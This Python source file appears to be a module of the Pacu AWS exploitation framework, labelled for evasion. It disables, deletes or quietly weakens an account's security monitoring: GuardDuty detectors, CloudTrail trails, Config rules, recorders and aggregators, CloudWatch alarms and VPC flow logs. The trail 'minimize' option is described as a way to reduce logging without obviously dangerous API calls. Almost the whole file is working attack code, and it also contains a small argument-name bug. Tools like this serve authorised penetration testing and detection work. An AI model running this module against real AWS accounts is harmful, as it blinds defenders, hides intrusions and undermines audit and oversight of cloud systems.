#!/usr/bin/env python3
import argparse
from copy import deepcopy


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'detection__disruption',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'EVADE',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Disables, deletes, or minimizes various logging/monitoring services.',

    # Full description about what the module does and how it works
    'description': 'This module will take enumerated CloudTrail trails, GuardDuty detectors, various Config settings, CloudWatch alarms, and VPC flow logs and present you with the option of disabling or deleting each one. For CloudTrail, you also have the option of minimizing it. Minimizing a trail leaves it enabled, but changes all the settings to their very basic level. These changes include: removing the associated SNS topic, disabling global service event logging, disabling multi-regional log collection, disabling log file validation, removing the associated CloudWatch log group/role, and disabling log file encryption. The idea of this is to minimize the amount of logging in the environment without calling dangerous APIs like disable or delete.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['GuardDuty', 'CloudTrail', 'EC2', 'Config', 'monitoring'],  # CloudWatch needs to be "monitoring" and VPC needs to be "EC2" here for "ls" to work

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['detection__enum_services'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--trails', '--detectors', '--config-rules', '--config-recorders', '--config-aggregators', '--alarms', '--flow-logs'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--trails', required=False, default=None, help='Comma-separated list of CloudTrail trail names and regions to target instead of enumerating them. They should be formatted like trail_name@region.')
parser.add_argument('--detectors', required=False, default=None, help='Comma-separated list of GuardDuty detector IDs and regions to target, instead of enumerating them. They should be formatted like detector_id@region.')
parser.add_argument('--config-rules', required=False, default=None, help='Comma-separated list of Config rule names and regions to target, instead of enumerating them. They should be formatted like rule_name@region.')
parser.add_argument('--config-recorders', required=False, default=None, help='Comma-separated list of Config configuration recorder names and regions to target, instead of enumerating them. They should be formatted like recorder_name@region.')
parser.add_argument('--config-aggregators', required=False, default=None, help='Comma-separated list of Config configuration aggregator names and regions to target, instead of enumerating them. They should be formatted like aggregator_name@region.')
parser.add_argument('--alarms', required=False, default=None, help='Comma-separated list of CloudWatch alarm names and regions to target, instead of enumerating them. They should be formatted like alarm_name@region.')
parser.add_argument('--flow-logs', required=False, default=None, help='Comma-separated list of VPC Flow Log IDs and regions to target, instead of enumerating them. They should be formatted like log_id@region.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    gd_regions = get_regions('guardduty')
    ct_regions = get_regions('cloudtrail')
    config_regions = get_regions('config')
    cw_regions = get_regions('monitoring')
    vpc_regions = get_regions('ec2')

    trails = []
    detectors = []
    rules = []
    recorders = []
    aggregators = []
    alarms = []
    flow_logs = []

    summary_data = {}

    # If any arguments are passed in, that that means to not check the database
    # to see if we need to enumerate stuff
    if any([
        args.alarms,
        args.trails,
        args.flow_logs,
        args.detectors,
        args.config_rules,
        args.config_recorders,
        args.config_aggregators
    ]):
        if args.trails is not None:
            ct_regions = set()
            for trail in args.trails.split(','):
                name, region = trail.split('@')
                trails.append({
                    'Name': name,
                    'Region': region
                })
                ct_regions.add(region)

        if args.detectors is not None:
            gd_regions = set()
            for detector in args.detectors.split(','):
                id, region = detector.split('@')
                detectors.append({
                    'Id': id,
                    'Region': region
                })
                gd_regions.add(region)

        tmp_config_regions = set()
        if args.config_rules is not None:
            for rule in args.config_rules.split(','):
                name, region = rule.split('@')
                rules.append({
                    'ConfigRuleName': name,
                    'Region': region
                })
                tmp_config_regions.add(region)

        if args.config_recorders is not None:
            for recorder in args.config_records.split(','):
                name, region = recorder.split('@')
                recorders.append({
                    'name': name,
                    'Region': region
                })
                tmp_config_regions.add(region)

        if args.config_aggregators is not None:
            for aggregator in args.config_aggregators.split(','):
                name, region = aggregator.split('@')
                aggregators.append({
                    'ConfigurationAggregatorName': name,
                    'Region': region
                })
                tmp_config_regions.add(region)

        if len(tmp_config_regions) > 0:
            config_regions = tmp_config_regions

        if args.alarms is not None:
            cw_regions = set()
            for alarm in args.alarms.split(','):
                name, region = alarm.split('@')
                alarms.append({
                    'AlarmName': name,
                    'Region': region
                })
                cw_regions.add(region)

        if args.flow_logs is not None:
            vpc_regions = set()
            for log in args.flow_logs.split(','):
                id, region = log.split('@')
                flow_logs.append({
                    'FlowLogId': id,
                    'Region': region
                })
                vpc_regions.add(region)
    else:
        # No arguments passed in, so disrupt everything. We need to
        # figure out what data from enum_monitoring is missing, so
        # that multiple calls are not required. This is done by
        # building an argument string after checking the DB.
        arguments = []
        cloudtrail_data = deepcopy(session.CloudTrail)
        guardduty_data = deepcopy(session.GuardDuty)
        config_data = deepcopy(session.Config)
        vpc_data = deepcopy(session.VPC)
        cloudwatch_data = deepcopy(session.CloudWatch)

        if 'Trails' not in cloudtrail_data:
            arguments.append('--cloud-trail')
        else:
            trails = cloudtrail_data['Trails']

        if 'Detectors' not in guardduty_data:
            arguments.append('--guard-duty')
        else:
            detectors = guardduty_data['Detectors']

        # If Rules isn't in there, then none of the other stuff has been enumerated either
        if 'Rules' not in config_data:
            arguments.append('--config')
        else:
            rules = config_data['Rules']
            recorders = config_data['Recorders']
            aggregators = config_data['Aggregators']

        if 'Alarms' not in cloudwatch_data:
            arguments.append('--cloud-watch')
        else:
            alarms = cloudwatch_data['Alarms']

        if 'FlowLogs' not in vpc_data:
            arguments.append('--vpc')
        else:
            flow_logs = vpc_data['FlowLogs']

        # If there is missing data, run enum_monitoring
        if len(arguments) > 0:
            if fetch_data(['Logging/Monitoring Data'], module_info['prerequisite_modules'][0], ' '.join(arguments)) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                trails = deepcopy(session.CloudTrail['Trails'])
                detectors = deepcopy(session.GuardDuty['Detectors'])
                rules = deepcopy(session.Config['Rules'])
                recorders = deepcopy(session.Config['Recorders'])
                aggregators = deepcopy(session.Config['Aggregators'])
                alarms = deepcopy(session.CloudWatch['Alarms'])
                flow_logs = deepcopy(session.VPC['FlowLogs'])

    if len(detectors) > 0:
        print('Starting GuardDuty...\n')
        summary_data['guardduty'] = {
            'disabled': 0,
            'deleted': 0,
        }
        for region in gd_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('guardduty', region)

            for detector in detectors:
                if detector['Region'] == region:
                    action = input('    GuardDuty detector ID: {}\n        Do you want to disable (dis), delete (del), or skip (s) it? (dis/del/s) '.format(detector['Id'])).strip().lower()

                    if action == 'dis':
                        try:
                            client.update_detector(
                                DetectorId=detector['Id'],
                                Enable=False
                            )
                            print('        Successfully disabled detector {}!\n'.format(detector['Id']))
                            summary_data['guardduty']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable detector {}:\n      {}\n'.format(detector['Id'], error))

                    elif action == 'del':
                        try:
                            client.delete_detector(
                                DetectorId=detector['Id']
                            )
                            print('        Successfully deleted detector {}!\n'.format(detector['Id']))
                            summary_data['guardduty']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete detector {}:\n      {}\n'.format(detector['Id'], error))

                    else:
                        print('    Skipping detector {}...\n'.format(detector['Id']))

        print('GuardDuty finished.\n')

    else:
        print('No detectors found. Skipping GuardDuty...\n')

    if len(trails) > 0:
        print('Starting CloudTrail...\n')
        summary_data['cloudtrail'] = {
            'disabled': 0,
            'deleted': 0,
            'minimized': 0,
        }
        for region in ct_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('cloudtrail', region)

            for trail in trails:
                if trail['Region'] == region:
                    action = input('    CloudTrail trail name: {}\n        Do you want to disable (dis), delete (del), minimize (m), or skip (s) it? (dis/del/m/s) '.format(trail['Name'])).strip().lower()

                    if action == 'dis':
                        try:
                            client.stop_logging(
                                Name=trail['Name']
                            )
                            print('        Successfully disabled trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'del':
                        try:
                            client.delete_trail(
                                Name=trail['Name']
                            )
                            print('        Successfully deleted trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete trail {}:\n      {}\n'.format(trail['Name'], error))

                    elif action == 'm':
                        try:
                            client.update_trail(
                                Name=trail['Name'],
                                SnsTopicName='',
                                IncludeGlobalServiceEvents=False,
                                IsMultiRegionTrail=False,
                                EnableLogFileValidation=False,
                                CloudWatchLogsLogGroupArn='',
                                CloudWatchLogsRoleArn='',
                                KmsKeyId=''
                            )
                            print('        Successfully minimized trail {}!\n'.format(trail['Name']))
                            summary_data['cloudtrail']['minimized'] += 1
                        except Exception as error:
                            print('        Could not minimize trail {}:\n      {}\n'.format(trail['Name'], error))

                    else:
                        print('        Skipping trail {}...\n'.format(trail['Name']))

        print('CloudTrail finished.\n')
    else:
        print('No trails found. Skipping CloudTrail...\n')

    if len(rules) > 0:
        print('Starting Config rules...\n')
        summary_data['awsconfig'] = {
            'rules': {
                'deleted': 0,
            },
            'recorders': {
                'deleted': 0,
                'stopped': 0,
            },
            'aggregators': {
                'deleted': 0,
            }
        }

        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('config', region)

            for rule in rules:
                if rule['Region'] == region:
                    action = input('    Rule Name: {}\n      Do you want to delete this rule? (y/n) '.format(rule['ConfigRuleName'])).strip().lower()
                    if action == 'y':
                        try:
                            client.delete_config_rule(
                                ConfigRuleName=rule['ConfigRuleName']
                            )
                            print('        Successfully deleted rule {}!\n'.format(rule['ConfigRuleName']))
                            summary_data['awsconfig']['rules']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete rule {}:\n          {}\n'.format(rule['ConfigRuleName'], error))
                    else:
                        print('        Skipping rule {}...\n'.format(rule['ConfigRuleName']))
        print('Config rules finished.\n')
    else:
        print('No rules found. Skipping Config rules...\n')

    if len(recorders) > 0:
        print('Starting Config recorders...\n')
        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('config', region)

            for recorder in recorders:
                if recorder['Region'] == region:
                    action = input('    Recorder Name: {}\n      Do you want to stop (stop), delete (del), or skip (skip) this recorder? (stop/del/skip) '.format(recorder['name'])).strip().lower()
                    if action == 'del':
                        try:
                            client.delete_configuration_recorder(
                                ConfigurationRecorderName=recorder['name']
                            )
                            print('        Successfully deleted recorder {}!\n'.format(recorder['name']))
                            summary_data['awsconfig']['recorders']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete recorder {}:\n          {}\n'.format(recorder['name'], error))
                    elif action == 'stop':
                        try:
                            client.stop_configuration_recorder(
                                ConfigurationRecorderName=recorder['name']
                            )
                            print('        Successfully stopped recorder {}!\n'.format(recorder['name']))
                            summary_data['awsconfig']['recorders']['stopped'] += 1
                        except Exception as error:
                            print('        Could not stop recorder {}:\n          {}\n'.format(recorder['name'], error))
                    else:
                        print('        Skipping recorder {}...\n'.format(recorder['name']))
        print('Config recorders finished.\n')
    else:
        print('No recorders found. Skipping Config recorders...\n')

    if len(aggregators) > 0:
        print('Starting Config aggregators...\n')
        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('config', region)

            for aggregator in aggregators:
                if aggregator['Region'] == region:
                    action = input('    Aggregator Name: {}\n      Do you want to delete this aggregator? (y/n) '.format(aggregator['ConfigurationAggregatorName'])).strip().lower()
                    if action == 'y':
                        try:
                            client.delete_configuration_aggregator(
                                ConfigurationAggregatorName=aggregator['ConfigurationAggregatorName']
                            )
                            print('        Successfully deleted aggregator {}!\n'.format(aggregator['ConfigurationAggregatorName']))
                            summary_data['awsconfig']['aggregators']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete aggregator {}:\n          {}\n'.format(aggregator['ConfigurationAggregatorName'], error))
                    else:
                        print('        Skipping aggregator {}...\n'.format(aggregator['ConfigurationAggregatorName']))
        print('Config aggregators finished.\n')
    else:
        print('No aggregators found. Skipping Config aggregators...\n')

    if len(alarms) > 0:
        print('Starting CloudWatch alarms...\n')
        summary_data['cloudwatch'] = {
            'deleted': 0,
            'disabled': 0,
        }
        for region in cw_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('cloudwatch', region)

            for alarm in alarms:
                if alarm['Region'] == region:
                    action = input('    Alarm Name: {}\n      Do you want to disable the associated actions (dis), delete (del), or skip (s) this alarm? (dis/del/s) '.format(alarm['AlarmName'])).strip().lower()
                    if action == 'del':
                        try:
                            # delete_alarms can take multiple alarm names in one request,
                            # but if there are ANY errors, no alarms are deleted, so I
                            # chose to do one at a time here
                            client.delete_alarms(
                                AlarmNames=[
                                    alarm['AlarmName']
                                ]
                            )
                            print('        Successfully deleted alarm {}!\n'.format(alarm['AlarmName']))
                            summary_data['cloudwatch']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete alarm {}:\n          {}\n'.format(alarm['AlarmName'], error))
                    elif action == 'dis':
                        try:
                            client.disable_alarm_actions(
                                AlarmNames=[
                                    alarm['AlarmName']
                                ]
                            )
                            print('        Successfully disabled actions for alarm {}!\n'.format(alarm['AlarmName']))
                            summary_data['cloudwatch']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable actions for alarm {}:\n          {}\n'.format(alarm['AlarmName'], error))
                    else:
                        print('        Skipping alarm {}...\n'.format(alarm['AlarmName']))
        print('CloudWatch alarms finished.\n')
    else:
        print('No alarms found. Skipping CloudWatch...\n')

    if len(flow_logs) > 0:
        print('Starting VPC flow logs...\n')
        summary_data['vpc'] = {
            'deleted': 0
        }
        for region in vpc_regions:
            print('  Starting region {}...\n'.format(region))

            client = pacu_main.get_boto3_client('ec2', region)

            logs_to_delete = []
            for log in flow_logs:
                if log['Region'] == region:
                    action = input('    Flow Log ID: {}\n      Do you want to delete this flow log? (y/n) '.format(log['FlowLogId'])).strip().lower()
                    if action == 'y':
                        logs_to_delete.append(log['FlowLogId'])
                        print('        Added flow log {} to list of logs to delete.'.format(log['FlowLogId']))
                    else:
                        print('        Skipping flow log {}...\n'.format(log['FlowLogId']))
            # We can batch delete these and not worry about any fails, as it will do as much as it can, unlike above
            try:
                response = client.delete_flow_logs(
                    FlowLogIds=logs_to_delete
                )
                print('        Attempt to delete all flow logs succeeded. Read the output for more information on any fails:\n          {}\n'.format(response))
                summary_data['vpc']['deleted'] += len(logs_to_delete) - len(response['Unsuccessful'])
            except Exception as error:
                print('        Attempt to delete flow logs failed:\n          {}\n'.format(error))
        print('VPC flow logs finished.\n')
    else:
        print('No flow logs found. Skipping VPC...\n')

    return summary_data


def summary(data, pacu_main):
    out = ''
    if 'guardduty' in data:
        out += '  GuardDuty:\n'
        out += '    {} detector(s) disabled.\n'.format(data['guardduty']['disabled'])
        out += '    {} detector(s) deleted.\n'.format(data['guardduty']['deleted'])
    if 'cloudtrail' in data:
        out += '  CloudTrail:\n'
        out += '    {} trail(s) disabled.\n'.format(data['cloudtrail']['disabled'])
        out += '    {} trail(s) deleted.\n'.format(data['cloudtrail']['deleted'])
        out += '    {} trail(s) minimized.\n'.format(data['cloudtrail']['minimized'])
    if 'awsconfig' in data:
        out += '  AWSConfig:\n'
        out += '    Rules:\n'
        out += '      {} rule(s) deleted.\n'.format(data['awsconfig']['rules']['deleted'])
        out += '    Recorders:\n'
        out += '      {} recorder(s) deleted.\n'.format(data['awsconfig']['recorders']['deleted'])
        out += '      {} recorder(s) stopped.\n'.format(data['awsconfig']['recorders']['stopped'])
        out += '    Aggregators:\n'
        out += '      {} aggregator(s) deleted.\n'.format(data['awsconfig']['aggregators']['deleted'])
    if 'vpc' in data:
        out += '  VPC:\n'
        out += '    {} flow log(s) deleted.\n'.format(data['vpc']['deleted'])
    return out
